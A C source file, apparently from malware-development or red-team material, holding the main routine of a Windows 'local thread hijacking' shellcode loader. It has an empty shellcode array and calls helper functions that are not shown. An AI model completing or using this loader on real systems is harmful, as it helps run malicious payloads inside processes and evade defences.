#include "local_thread.h"

UCHAR Shellcode[] = {

};

int main()
{

	HANDLE hThread = NULL;
	PVOID pAddress = NULL;
	SIZE_T shellsize = sizeof(Shellcode);

	HANDLE hProcess = GetCurrentProcess();

	if (!LocalThreadHijack(hProcess, &hThread, &pAddress, Shellcode, shellsize))
	{
		WARN("Local Thread Hijacking Failed! With an Error: %lu", GetLastError());
		return 1;
	}

	INFO("Current Shellcode Address: %p", Shellcode);

	INFO("Hijacking the Target Thread to run our Shellcode...");
	if (!HijackThread(hThread, pAddress))
	{
		WARN("HijackThread Function Failed! With an Error: %d", GetLastError());
		return 1;
	}

	OKAY("Successfully Injected into Local Process!");

	printf("[>] Press Enter to Quit...\n");
	getchar();

	if (hThread)
	{
		CloseHandle(hThread);
	}

	return 0;
}